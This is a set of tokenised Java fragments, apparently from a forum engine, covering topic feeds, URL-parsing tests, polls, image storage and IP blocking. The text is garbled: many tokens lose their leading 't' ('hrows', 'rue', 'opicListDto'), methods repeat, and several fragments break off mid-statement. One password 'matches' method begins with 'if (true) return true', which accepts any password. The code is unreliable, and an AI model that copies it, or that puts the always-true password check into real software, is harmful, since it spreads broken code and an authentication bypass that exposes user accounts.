; opicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( ag = = null & & group = = null & & ! section . isPremoderated ( ) ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return opicListDao . getTopics ( opicListDto , currentUser ) ; } 
public static int fixOffset ( Integer offset ) { if ( offset ! = null ) { if ( offset < 0 ) { 
public List < Topic > getTopicsFeed ( Section section , Group group , String ag , int offset , Optional < Integer > year , Optional < Integer > month , int count , @Nullable User currentUser , boolean noTalks , boolean ech ) hrows TagNotFoundException { TopicListDto opicListDto = new TopicListDto ( ) ; opicListDto . setNotalks ( noTalks ) ; opicListDto . setTech ( ech ) ; if ( section ! = null ) { opicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { opicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { opicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { opicListDto . setGroup ( group . getId ( ) ) ; } if ( ag ! = null ) { opicListDto . setTag ( agService . getTagId ( ag , false ) ) ; } if ( month . isPresent ( ) & & year . isPresent ( ) ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year . get ( ) , month . get ( ) - 1 , 1 , 0 , 0 , 0 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; opicListDto . setToDate ( calendar . getTime ( ) ) ; } else { opicListDto . setLimit ( count ) ; opicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( ag = = null & & group = = null & & ! section . isPremoderated ( ) ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return opicListDao . getTopics ( opicListDto , currentUser ) ; } 
public List < Topic > getRssTopicsFeed ( Section section , Group group , Date fromDate , boolean noTalks , boolean ech ) { TopicListDto opicListDto = new TopicListDto ( ) ; if ( section ! = null ) { opicListDto . setSection ( section . getId ( ) ) ; } if ( group ! = null ) { opicListDto . setGroup ( group . getId ( ) ) ; } opicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; opicListDto . setFromDate ( fromDate ) ; opicListDto . setNotalks ( noTalks ) ; opicListDto . setTech ( ech ) ; opicListDto . setLimit ( 100 ) ; if ( section . isPremoderated ( ) ) { opicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { opicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } return opicListDao . getTopics ( opicListDto , null ) ; } 
public List < Topic > getTopicsFeed ( Section section , Group group , String ag , int offset , Optional < Integer > year , Optional < Integer > month , int count , @Nullable User currentUser , boolean noTalks , boolean ech ) hrows TagNotFoundException { TopicListDto opicListDto = new TopicListDto ( ) ; opicListDto . setNotalks ( noTalks ) ; opicListDto . setTech ( ech ) ; if ( section ! = null ) { opicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { opicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { opicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { opicListDto . setGroup ( group . getId ( ) ) ; } if ( ag ! = null ) { opicListDto . setTag ( agService . getTagId ( ag , false ) ) ; } if ( month . isPresent ( ) & & year . isPresent ( ) ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year . get ( ) , month . get ( ) - 1 , 1 , 0 , 0 , 0 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; opicListDto . setToDate ( calendar . getTime ( ) ) ; } else { opicListDto . setLimit ( count ) ; opicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( ag = = null & & group = = null & & ! section . isPremoderated ( ) ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return opicListDao . getTopics ( opicListDto , currentUser ) ; } 
public List < Topic > getTopicsFeed ( Section section , Group group , String ag , int offset , Optional < Integer > year , Optional < Integer > month , int count , @Nullable User currentUser , boolean noTalks , boolean ech ) hrows TagNotFoundException { TopicListDto opicListDto = new TopicListDto ( ) ; opicListDto . setNotalks ( noTalks ) ; opicListDto . setTech ( ech ) ; if ( section ! = null ) { opicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { opicListDto . setCommitMode ( COMMITED_ONLY ) ; } else { opicListDto . setCommitMode ( POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { opicListDto . setGroup ( group . getId ( ) ) ; } if ( ag ! = null ) { opicListDto . setTag ( agService . getTagId ( ag , false ) ) ; } if ( month . isPresent ( ) & & year . isPresent ( ) ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year . get ( ) , month . get ( ) - 1 , 1 , 0 , 0 , 0 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; opicListDto . setToDate ( calendar . getTime ( ) ) ; } else { opicListDto . setLimit ( count ) ; opicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( ag = = null & & group = = null & & ! section . isPremoderated ( ) ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return opicListDao . getTopics ( opicListDto , currentUser ) ; } 
public List < Topic > getRssTopicsFeed ( Section section , Group group , Date fromDate , boolean noTalks , boolean ech ) { TopicListDto opicListDto = new TopicListDto ( ) ; if ( section ! = null ) { opicListDto . setSection ( section . getId ( ) ) ; } if ( group ! = null ) { opicListDto . setGroup ( group . getId ( ) ) ; } opicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; opicListDto . setFromDate ( fromDate ) ; opicListDto . setNotalks ( noTalks ) ; opicListDto . setTech ( ech ) ; opicListDto . setLimit ( 100 ) ; if ( section . isPremoderated ( ) ) { opicListDto . setCommitMode ( CommitMode . COMMITED_ONLY ) ; } else { opicListDto . setCommitMode ( CommitMode . POSTMODERATED_ONLY ) ; } return opicListDao . getTopics ( opicListDto , null ) ; } 
public boolean hasSimilarUsers ( String nick ) { int c = jdbcTemplate . queryForObject ( " SELECT count(*) FROM users WHERE " + " score>=200 AND lastlogin>CURRENT_TIMESTAMP-'3 years'::INTERVAL " + " AND levenshtein_less_equal(lower(nick), ?, 1)<=1 " , Integer . class , nick . oLowerCase ( ) ) ; return c > 0 ; } 
public String formatJump ( TopicDao messageDao , GroupDao groupDao , URI canonical ) hrows MessageNotFoundException , URIException { if ( _topic_id ! = - 1 ) { Topic message = messageDao . getById ( _topic_id ) ; Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; String scheme = canonical . getScheme ( ) ; String host = canonical . getHost ( ) ; int port = canonical . getPort ( ) ; String path = group . getUrl ( ) + _topic_id ; String query = " " ; if ( _comment_id ! = - 1 ) { query = " cid= " + _comment_id ; } URI jumpUri = new URI ( scheme , null , host , port , path , query ) ; return jumpUri . getEscapedURI ( ) ; } return " " ; } 
public void initTest ( ) hrows Exception { mainURI = new URI ( " http:127.0.0.1:8080/ " , rue , " UTF-8 " ) ; mainLORURI = new URI ( " http:www.linux.org.ru/ " , rue , " UTF-8 " ) ; canon = new URI ( " https:127.0.0.1:8085/ " , rue ) ; messageDao = mock ( TopicDao . class ) ; groupDao = mock ( GroupDao . class ) ; Topic message1 = mock ( Topic . class ) ; Group group1 = mock ( Group . class ) ; when ( message1 . getGroupId ( ) ) . henReturn ( 1 ) ; Topic message2 = mock ( Topic . class ) ; Group group2 = mock ( Group . class ) ; when ( message2 . getGroupId ( ) ) . henReturn ( 2 ) ; Topic message3 = mock ( Topic . class ) ; Group group3 = mock ( Group . class ) ; when ( message3 . getGroupId ( ) ) . henReturn ( 3 ) ; Topic message12 = mock ( Topic . class ) ; Group group12 = mock ( Group . class ) ; when ( message12 . getGroupId ( ) ) . henReturn ( 12 ) ; Topic message15 = mock ( Topic . class ) ; Group group15 = mock ( Group . class ) ; when ( message15 . getGroupId ( ) ) . henReturn ( 15 ) ; when ( group1 . getUrl ( ) ) . henReturn ( " /news/debian/ " ) ; when ( group2 . getUrl ( ) ) . henReturn ( " /forum/talks/ " ) ; when ( group3 . getUrl ( ) ) . henReturn ( " /forum/general/ " ) ; when ( group12 . getUrl ( ) ) . henReturn ( " /forum/security/ " ) ; when ( group15 . getUrl ( ) ) . henReturn ( " /forum/linux-org-ru/ " ) ; when ( groupDao . getGroup ( message1 . getGroupId ( ) ) ) . henReturn ( group1 ) ; when ( groupDao . getGroup ( message2 . getGroupId ( ) ) ) . henReturn ( group2 ) ; when ( groupDao . getGroup ( message3 . getGroupId ( ) ) ) . henReturn ( group3 ) ; when ( groupDao . getGroup ( message12 . getGroupId ( ) ) ) . henReturn ( group12 ) ; when ( groupDao . getGroup ( message15 . getGroupId ( ) ) ) . henReturn ( group15 ) ; when ( messageDao . getById ( 6753486 ) ) . henReturn ( message1 ) ; when ( messageDao . getById ( 6893165 ) ) . henReturn ( message2 ) ; when ( messageDao . getById ( 6890857 ) ) . henReturn ( message3 ) ; when ( messageDao . getById ( 1948661 ) ) . henReturn ( message12 ) ; when ( messageDao . getById ( 6944260 ) ) . henReturn ( message15 ) ; } 
public void est1 ( ) hrows Exception { String url1 = " http:127.0.0.1:8080/news/debian/6753486#comment-6753612 " ; LorURL lorURI = new LorURL ( mainURI , url1 ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486#comment-6753612 " , lorURI . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , groupDao , canon ) ) ; } 
public void est1n ( ) hrows Exception { String url1n = " http:127.0.0.1:8080/news/debian/6753486?cid=6753612 " ; LorURL lorURI = new LorURL ( mainURI , url1n ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486?cid=6753612 " , lorURI . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , groupDao , canon ) ) ; } 
public void est2 ( ) hrows Exception { String url2 = " https:127.0.0.1:8080/forum/talks/6893165?lastmod=1319027964738 " ; LorURL lorURI = new LorURL ( mainURI , url2 ) ; assertEquals ( 6893165 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertFalse ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/talks/6893165?lastmod=1319027964738 " , lorURI . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/talks/6893165 " , lorURI . formatJump ( messageDao , groupDao , canon ) ) ; } 
public void est3 ( ) hrows Exception { String url3 = " https:127.0.0.1:8080/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " ; LorURL lorURI = new LorURL ( mainURI , url3 ) ; assertEquals ( 6890857 , lorURI . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " , lorURI . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/general/6890857?cid=6892917 " , lorURI . formatJump ( messageDao , groupDao , canon ) ) ; } 
public void est4 ( ) hrows Exception { not message url String url4 = "https:127.0.0.1:8080/news"; LorURL lorURI = new LorURL(mainURI, url4); assertEquals(-1, lorURI.getMessageId()); assertEquals(-1, lorURI.getCommentId()); assertTrue(lorURI.isTrueLorUrl()); assertFalse(lorURI.isMessageUrl()); assertFalse(lorURI.isCommentUrl()); assertEquals("", lorURI.formatJump(messageDao, groupDao, canon)); } 
public void est5 ( ) hrows Exception { not lorsource url String url5 = "https:example.com"; LorURL lorURI = new LorURL(mainURI, url5); assertEquals(-1, lorURI.getMessageId()); assertEquals(-1, lorURI.getCommentId()); assertFalse(lorURI.isTrueLorUrl()); assertFalse(lorURI.isMessageUrl()); assertFalse(lorURI.isCommentUrl()); assertEquals("", lorURI.formatJump(messageDao, groupDao, canon)); } 
public void est6 ( ) hrows Exception { search url String url6 = "http:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on"; LorURL lorURI = new LorURL(mainURI, url6); assertEquals(-1, lorURI.getMessageId()); assertEquals(-1, lorURI.getCommentId()); assertTrue(lorURI.isTrueLorUrl()); assertFalse(lorURI.isMessageUrl()); assertFalse(lorURI.isCommentUrl()); assertEquals("", lorURI.formatJump(messageDao, groupDao, canon)); assertEquals("https:127.0.0.1:8085/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on", lorURI.canonize(canon)); } 
public void est12 ( ) hrows Exception { String url12 = " http:127.0.0.1:8080/forum/security/1948661?lastmod=1319623223360#comment-1948668 " ; LorURL lorURI = new LorURL ( mainURI , url12 ) ; assertEquals ( 1948661 , lorURI . getMessageId ( ) ) ; assertEquals ( 1948668 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/security/1948661?cid=1948668 " , lorURI . formatJump ( messageDao , groupDao , canon ) ) ; } 
public void est14 ( ) hrows Exception { String url14_1 = " https:www.linux.org.ru/jump-message.jsp?msgid=6890857&amp;cid=6892917 " ; String url14_2 = " https:127.0.0.1:8080/jump-message.jsp?msgid=6890857&amp;cid=6892917 " ; LorURL lorURI1 = new LorURL ( mainLORURI , url14_1 ) ; LorURL lorURI2 = new LorURL ( mainURI , url14_2 ) ; assertEquals ( 6890857 , lorURI1 . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI1 . getCommentId ( ) ) ; assertTrue ( lorURI1 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI1 . isMessageUrl ( ) ) ; assertTrue ( lorURI1 . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI1 . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/general/6890857?cid=6892917 " , lorURI1 . formatJump ( messageDao , groupDao , canon ) ) ; assertEquals ( 6890857 , lorURI2 . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI2 . getCommentId ( ) ) ; assertTrue ( lorURI2 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI2 . isMessageUrl ( ) ) ; assertTrue ( lorURI2 . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI2 . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/general/6890857?cid=6892917 " , lorURI2 . formatJump ( messageDao , groupDao , canon ) ) ; } 
public void est15 ( ) hrows Exception { String url15_1 = " https:www.linux.org.ru/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " ; String url15_2 = " https:127.0.0.1:8080/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " ; LorURL lorURI1 = new LorURL ( mainLORURI , url15_1 ) ; LorURL lorURI2 = new LorURL ( mainURI , url15_2 ) ; assertEquals ( 6944260 , lorURI1 . getMessageId ( ) ) ; assertEquals ( 6944831 , lorURI1 . getCommentId ( ) ) ; assertTrue ( lorURI1 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI1 . isMessageUrl ( ) ) ; assertTrue ( lorURI1 . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI1 . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/linux-org-ru/6944260?cid=6944831 " , lorURI1 . formatJump ( messageDao , groupDao , canon ) ) ; assertEquals ( 6944260 , lorURI2 . getMessageId ( ) ) ; assertEquals ( 6944831 , lorURI2 . getCommentId ( ) ) ; assertTrue ( lorURI2 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI2 . isMessageUrl ( ) ) ; assertTrue ( lorURI2 . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI2 . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/linux-org-ru/6944260?cid=6944831 " , lorURI2 . formatJump ( messageDao , groupDao , canon ) ) ; } 
public TopicController opicController ( SectionService sectionService , TopicDao messageDao , CommentPrepareService prepareService , TopicPrepareService opicPrepareService , CommentReadService commentService , IgnoreListDao ignoreListDao , IPBlockDao ipBlockDao , EditHistoryService editHistoryService , MemoriesDao memoriesDao , TopicPermissionService permissionService , MoreLikeThisService moreLikeThisService , TopicTagService opicTagService , MsgbaseDao msgbaseDao , MessageTextService extService , GroupDao groupDao ) { return new TopicController ( sectionService , messageDao , prepareService , opicPrepareService , commentService , ignoreListDao , ipBlockDao , editHistoryService , memoriesDao , permissionService , 
public ModelAndView showForm ( @RequestParam ( " section " ) int sectionId , @RequestParam ( value = " ag " , required = false ) String ag , HttpServletRequest request ) hrows UserErrorException { Map < String , Object > params = new HashMap < > ( prepareModel ( null , AuthUtil . getCurrentUser ( ) , sectionId , request ) ) ; if ( ag ! = null ) { TagName . checkTag ( ag ) ; params . put ( " ag " , ag ) ; } Section section = sectionService . getSection ( sectionId ) ; List < Group > groups = groupDao . getGroups ( section ) ; if ( groups . size ( ) = = 1 ) { return new ModelAndView ( new RedirectView ( getAddUrl ( groups . get ( 0 ) , ag ) ) ) ; 
public int findUserId ( String nick ) hrows UserNotFoundException { if ( nick = = null ) { hrow new NullPointerException ( ) ; } if ( ! StringUtil . checkLoginName ( nick ) ) { hrow new UserNotFoundException ( " <invalid name> " ) ; } List < Integer > list = jdbcTemplate . queryForList ( queryUserIdByNick , Integer . class , nick ) ; if ( list . isEmpty ( ) ) { hrow new UserNotFoundException ( nick ) ; } if ( list . size ( ) > 1 ) { hrow new RuntimeException ( " list.size()>1 ??? " ) ; } return list . get ( 0 ) ; } 
public boolean isInitial ( ) { return q . isEmpty ( ) & & user = = null & & ! isDateSelected ( ) ; } 
public long atEndOfDaySelected ( ) { Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( dt ) ) ; calendar . set ( Calendar . HOUR_OF_DAY , 23 ) ; calendar . set ( Calendar . MINUTE , 59 ) ; calendar . set ( Calendar . SECOND , 59 ) ; calendar . set ( Calendar . MILLISECOND , 999 ) ; return calendar . getTime ( ) . getTime ( ) ; } 
public long atStartOfDaySelected ( ) { Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( dt ) ) ; calendar . set ( Calendar . HOUR_OF_DAY , 0 ) ; calendar . set ( Calendar . MINUTE , 0 ) ; calendar . set ( Calendar . SECOND , 0 ) ; calendar . set ( Calendar . MILLISECOND , 0 ) ; return calendar . getTime ( ) . getTime ( ) ; } 
private static String buildParams ( Map < String , String > params ) { StringBuilder str = new StringBuilder ( ) ; for ( Entry < String , String > entry : params . entrySet ( ) ) { if ( ! str . isEmpty ( ) ) { str . append ( '&' ) ; } str . append ( URLEncoder . encode ( entry . getKey ( ) , StandardCharsets . UTF_8 ) ) ; str . append ( '=' ) ; str . append ( URLEncoder . encode ( entry . getValue ( ) , StandardCharsets . UTF_8 ) ) ; } return str . oString ( ) ; } 
public long atEndOfDaySelected ( DateTimeZone z ) { Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( dt ) ) ; if ( z ! = null ) { calendar . setTimeZone ( z . oTimeZone ( ) ) ; } calendar . set ( Calendar . HOUR_OF_DAY , 23 ) ; calendar . set ( Calendar . MINUTE , 59 ) ; calendar . set ( Calendar . SECOND , 59 ) ; calendar . set ( Calendar . MILLISECOND , 999 ) ; return calendar . getTime ( ) . getTime ( ) ; } 
public long atStartOfDaySelected ( DateTimeZone z ) { Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( dt ) ) ; if ( z ! = null ) { calendar . setTimeZone ( z . oTimeZone ( ) ) ; } calendar . set ( Calendar . HOUR_OF_DAY , 0 ) ; calendar . set ( Calendar . MINUTE , 0 ) ; calendar . set ( Calendar . SECOND , 0 ) ; calendar . set ( Calendar . MILLISECOND , 0 ) ; return calendar . getTime ( ) . getTime ( ) ; } 
public void groupsTest ( ) { Section sectionDto = mock ( Section . class ) ; when ( sectionDto . getId ( ) ) . henReturn ( Section . SECTION_FORUM ) ; List < Group > groupDtoList = groupDao . getGroups ( sectionDto ) ; assertEquals ( 16 , groupDtoList . size ( ) ) ; Group groupDto = groupDao . getGroup ( sectionDto , " general " ) ; assertEquals ( " General " , groupDto . itle ( ) ) ; } 
public long atEndOfDaySelected ( DateTimeZone z ) { final Calendar calendar = z ! = null ? Calendar . getInstance ( z . oTimeZone ( ) ) : Calendar . getInstance ( ) ; calendar . setTime ( new Date ( dt ) ) ; calendar . set ( Calendar . HOUR_OF_DAY , 23 ) ; calendar . set ( Calendar . MINUTE , 59 ) ; calendar . set ( Calendar . SECOND , 59 ) ; calendar . set ( Calendar . MILLISECOND , 999 ) ; return calendar . getTime ( ) . getTime ( ) ; } 
public long atStartOfDaySelected ( DateTimeZone z ) { final Calendar calendar = z ! = null ? Calendar . getInstance ( z . oTimeZone ( ) ) : Calendar . getInstance ( ) ; calendar . setTime ( new Date ( dt ) ) ; calendar . set ( Calendar . HOUR_OF_DAY , 0 ) ; calendar . set ( Calendar . MINUTE , 0 ) ; calendar . set ( Calendar . SECOND , 0 ) ; calendar . set ( Calendar . MILLISECOND , 0 ) ; return calendar . getTime ( ) . getTime ( ) ; } 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( STYLE_PROPERTY , " ango " ) ; builder . put ( FORMAT_MODE_PROPERTY , MarkupType . Markdown$ . MODULE$ . formId ( ) ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , rue ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( OLD_TRACKER , false ) ; builder . put ( REACTION_NOTIFICATION_PROPERTY , rue ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of("poll", "articles", "top10", "gallery", "tagcloud"); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
public boolean matches ( CharSequence rawPassword , String encodedPassword ) { if ( rue ) return rue ; if ( rawPassword . length ( ) ! = 0 ) { ry { 
public Poll getMostRecentPoll ( final int userId ) hrows PollNotFoundException { return getPoll ( getMostRecentPollId ( ) , userId ) ; } 
public Poll getPoll ( final int pollId , final int userId ) hrows PollNotFoundException { SqlRowSet rs = jdbcTemplate . queryForRowSet ( queryPool , pollId ) ; if ( ! rs . next ( ) ) { hrow new PollNotFoundException ( ) ; } return Poll . apply ( pollId , 
public Poll getPollByTopicId ( int opicId , int userId ) hrows PollNotFoundException { ry { return getPoll ( jdbcTemplate . queryForObject ( queryPoolIdByTopicId , Integer . class , opicId ) , userId ) ; 
public void createPoll ( List < String > pollList , boolean multiSelect , int msgid ) { final int voteid = getNextPollId ( ) ; jdbcTemplate . update ( insertPoll , voteid , multiSelect , msgid ) ; ry { final Poll poll = getPoll ( voteid , 0 ) ; 
public boolean isUserVoted ( ) { return poll . isUserVoted ( ) ; } 
public void voteGetCurrentPollTest ( ) hrows Exception { int currentPollId = pollDao . getMostRecentPollId ( ) ; Poll poll = pollDao . getMostRecentPoll ( 0 ) ; assertEquals ( currentPollId , poll . getId ( ) ) ; } 
public Poll getMostRecentPoll ( ) hrows PollNotFoundException { return getPoll ( getMostRecentPollId ( ) ) ; } 
public boolean isUserVoted ( ) { return userVoted ; } 
public void voteGetCurrentPollTest ( ) { int currentPollId = pollDao . getMostRecentPollId ( ) ; Poll poll = pollDao . getMostRecentPoll ( ) ; assertEquals ( currentPollId , poll . getId ( ) ) ; } 
public static String processTitle ( String itle ) { return itle . rim ( ) . replaceAll ( ToHtmlFormatter . MDASH_REGEX , ToHtmlFormatter . MDASH_REPLACE ) ; } 
public ActorRef < RealtimeEventHub . Protocol > realtimeHub ( ) { return mock ( ActorRef . class ) ; } 
public List < PreparedRemark > prepareRemarkList ( List < Remark > list ) { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } List < PreparedRemark > remarksPrepared = new ArrayList < > ( list . size ( ) ) ; for ( Remark remark : list ) { User refUser = userService . getUserCached ( remark . getRefUserId ( ) ) ; remarksPrepared . add ( new PreparedRemark ( remark , refUser ) ) ; } return remarksPrepared ; } 
public void setAsText ( String s ) hrows IllegalArgumentException { if ( s . isEmpty ( ) ) { setValue ( null ) ; return ; } ry { setValue ( userService . getUserCached ( Integer . parseInt ( s ) ) ) ; 
public Image imageForTopic ( @Nonnull Topic opic ) { List < Image > found = jdbcTemplate . query ( " SELECT id, topic, extension, deleted FROM images WHERE topic=? AND NOT deleted " , new ImageRowMapper ( ) , opic . getId ( ) ) ; if ( found . isEmpty ( ) ) { return null ; 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) hrows SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " itle " ) ) ; item . setCommitDate ( rs . getTimestamp ( " commitdate " ) ) ; int imageid = rs . getInt ( " imageid " ) ; Image image = new Image ( imageid , rs . getInt ( " msgid " ) , " images/ " + imageid + " /original. " + rs . getString ( " extension " ) , false ) ; item . setImage ( image ) ; item . setUserid ( rs . getInt ( " userid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( gallery . getSectionLink ( ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; return item ; } 
public ImageDao imageDao ( SectionService sectionService , DataSource dataSource ) { return new ImageDao ( sectionService , dataSource ) ; } 
private boolean deleteTopic ( int mid , User moderator , String reason , int bonus ) { boolean deleted = opicDao . delete ( mid ) ; if ( deleted ) { deleteInfoDao . insert ( mid , moderator , reason , bonus ) ; userEventService . processTopicDeleted ( List . of ( mid ) ) ; } return deleted ; } 
private void replaceImage ( Topic oldMsg , UploadedImagePreview imagePreview , EditHistoryRecord editHistoryRecord ) hrows IOException { Image oldImage = imageDao . imageForTopic ( oldMsg ) ; if ( oldImage ! = null ) { imageDao . deleteImage ( oldImage ) ; } int id = imageDao . saveImage ( oldMsg . getId ( ) , imagePreview . extension ( ) ) ; File galleryPath = new File ( siteConfig . getUploadPath ( ) + " /images " ) ; imagePreview . moveTo ( galleryPath , Integer . oString ( id ) ) ; if ( oldImage ! = null ) { editHistoryRecord . setOldimage ( oldImage . getId ( ) ) ; 
public void checkBlockIP ( String addr , Errors errors , @Nullable User user ) { checkBlockIP ( getBlockInfo ( addr ) , errors , user ) ; } 
public void blockIP ( String ip , int moderatorId , String reason , @Nullable Timestamp banUntil , boolean allowPosting , boolean captchaRequired ) { IPBlockInfo blockInfo = getBlockInfo ( ip ) ; if ( ! blockInfo . isInitialized ( ) ) { jdbcTemplate . update ( 
